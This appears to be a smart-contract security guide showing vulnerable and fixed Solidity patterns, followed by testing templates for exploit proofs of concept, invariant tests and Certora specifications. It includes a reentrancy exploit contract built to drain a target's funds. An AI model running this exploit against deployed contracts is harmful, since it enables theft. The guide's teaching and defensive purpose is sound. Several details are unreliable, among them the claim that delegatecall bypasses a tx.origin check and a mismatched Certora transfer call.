# Common Vulnerability Patterns

Access control, arithmetic issues, and common security anti-patterns.
## Common Vulnerability Patterns

### Access Control Bypass

```solidity
// VULNERABLE: Missing access control
function setAdmin(address newAdmin) external {
    admin = newAdmin; // Anyone can call
}

// VULNERABLE: Incorrect access control
function withdraw() external {
    require(msg.sender == tx.origin, "No contracts");
    // Can be bypassed with delegatecall
}

// VULNERABLE: Logic error in access control
function updateConfig(uint256 value) external {
    if (msg.sender == admin) {
        config = value;
    }
    // Still executes after the if block!
    doSomethingElse();
}

// FIX: Proper access control
function setAdmin(address newAdmin) external {
    require(msg.sender == admin, "Not admin");
    require(newAdmin != address(0), "Invalid address");
    emit AdminChanged(admin, newAdmin);
    admin = newAdmin;
}
```

### Integer Overflow/Underflow

```solidity
// VULNERABLE: Unchecked arithmetic (pre-0.8.0)
function transfer(address to, uint256 amount) external {
    balances[msg.sender] -= amount; // Can underflow
    balances[to] += amount;          // Can overflow
}

// VULNERABLE: Explicit unchecked block
function distribute(uint256 amount, uint256 recipients) external {
    unchecked {
        uint256 perRecipient = amount / recipients; // Division by zero
        // Overflow still possible in unchecked
    }
}

// FIX: Use SafeMath or checked operations
function transfer(address to, uint256 amount) external {
    require(balances[msg.sender] >= amount, "Insufficient balance");
    balances[msg.sender] -= amount;
    balances[to] += amount;
}

// FIX: Validate before unchecked
function distribute(uint256 amount, uint256 recipients) external {
    require(recipients > 0, "No recipients");
    unchecked {
        uint256 perRecipient = amount / recipients;
        // Safe because we validated recipients > 0
    }
}
```

### Timestamp Dependence

```solidity
// VULNERABLE: Strict equality on timestamp
function claim() external {
    require(block.timestamp == unlockTime, "Not unlocked");
    // May never be exactly equal
}

// VULNERABLE: Timestamp manipulation
function random() external view returns (uint256) {
    return uint256(keccak256(abi.encodePacked(block.timestamp)));
    // Miner can manipulate within 15 seconds
}

// FIX: Use >= for time checks
function claim() external {
    require(block.timestamp >= unlockTime, "Not unlocked");
    // Will work when time is reached
}

// FIX: Use Chainlink VRF for randomness
function requestRandom() external {
    requestId = COORDINATOR.requestRandomWords(
        keyHash,
        subscriptionId,
        requestConfirmations,
        callbackGasLimit,
        numWords
    );
}
```

## Testing and Verification

### Exploit Development

```solidity
// Proof of Concept template
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "../src/VulnerableContract.sol";

contract ExploitTest is Test {
    VulnerableContract target;
    Exploit exploit;

    address attacker = address(0x1337);
    address victim = address(0xdead);

    function setUp() public {
        // Deploy target contract
        target = new VulnerableContract();

        // Setup initial state
        vm.deal(victim, 100 ether);
        vm.prank(victim);
        target.deposit{value: 100 ether}();

        // Deploy exploit contract
        exploit = new Exploit(address(target));
        vm.deal(address(exploit), 1 ether);
    }

    function testExploit() public {
        // Record initial balances
        uint256 initialVictimBalance = address(victim).balance;
        uint256 initialAttackerBalance = address(exploit).balance;
        uint256 initialTargetBalance = address(target).balance;

        console.log("Initial state:");
        console.log("Victim balance:", initialVictimBalance);
        console.log("Attacker balance:", initialAttackerBalance);
        console.log("Target balance:", initialTargetBalance);

        // Execute exploit
        vm.prank(attacker);
        exploit.attack();

        // Record final balances
        uint256 finalVictimBalance = address(victim).balance;
        uint256 finalAttackerBalance = address(exploit).balance;
        uint256 finalTargetBalance = address(target).balance;

        console.log("\nFinal state:");
        console.log("Victim balance:", finalVictimBalance);
        console.log("Attacker balance:", finalAttackerBalance);
        console.log("Target balance:", finalTargetBalance);

        // Verify exploit success
        assertEq(finalTargetBalance, 0, "Target not drained");
        assertGt(
            finalAttackerBalance,
            initialAttackerBalance,
            "Attacker did not profit"
        );
    }
}

contract Exploit {
    VulnerableContract target;
    uint256 attackCount;

    constructor(address _target) {
        target = VulnerableContract(_target);
    }

    function attack() external {
        target.deposit{value: 1 ether}();
        target.withdraw();
    }

    receive() external payable {
        if (attackCount < 10 && address(target).balance >= 1 ether) {
            attackCount++;
            target.withdraw();
        }
    }
}
```

### Invariant Testing

```solidity
// Invariant test template
contract InvariantTest is Test {
    Contract target;
    Handler handler;

    function setUp() public {
        target = new Contract();
        handler = new Handler(target);

        targetContract(address(handler));
    }

    // Invariant: total supply equals sum of balances
    function invariant_totalSupply() public {
        assertEq(
            target.totalSupply(),
            handler.sumOfBalances()
        );
    }

    // Invariant: user balance never exceeds total supply
    function invariant_balanceBound() public {
        assertTrue(
            handler.maxBalance() <= target.totalSupply()
        );
    }
}

contract Handler {
    Contract target;
    uint256 public sumOfBalances;
    uint256 public maxBalance;

    constructor(Contract _target) {
        target = _target;
    }

    function mint(address to, uint256 amount) public {
        amount = bound(amount, 0, 1e30);
        target.mint(to, amount);
        _updateMetrics(to);
    }

    function burn(address from, uint256 amount) public {
        amount = bound(amount, 0, target.balanceOf(from));
        target.burn(from, amount);
        _updateMetrics(from);
    }

    function _updateMetrics(address user) internal {
        sumOfBalances = target.totalSupply();
        uint256 balance = target.balanceOf(user);
        if (balance > maxBalance) {
            maxBalance = balance;
        }
    }
}
```

### Formal Verification

```
// Certora specification example
methods {
    balanceOf(address) returns uint256 envfree
    totalSupply() returns uint256 envfree
    transfer(address, uint256) returns bool
}

// Invariant: sum of balances equals total supply
invariant sumOfBalancesEqualsTotalSupply()
    sumOfBalances() == totalSupply()

// Rule: transfer preserves total supply
rule transferPreservesTotalSupply {
    address from; address to; uint256 amount;
    uint256 supplyBefore = totalSupply();

    transfer(from, to, amount);

    uint256 supplyAfter = totalSupply();
    assert supplyBefore == supplyAfter;
}

// Rule: transfer updates balances correctly
rule transferUpdatesBalances {
    address from; address to; uint256 amount;

    require from != to;

    uint256 fromBalanceBefore = balanceOf(from);
    uint256 toBalanceBefore = balanceOf(to);

    transfer(from, to, amount);

    uint256 fromBalanceAfter = balanceOf(from);
    uint256 toBalanceAfter = balanceOf(to);

    assert fromBalanceAfter == fromBalanceBefore - amount;
    assert toBalanceAfter == toBalanceBefore + amount;
}
```
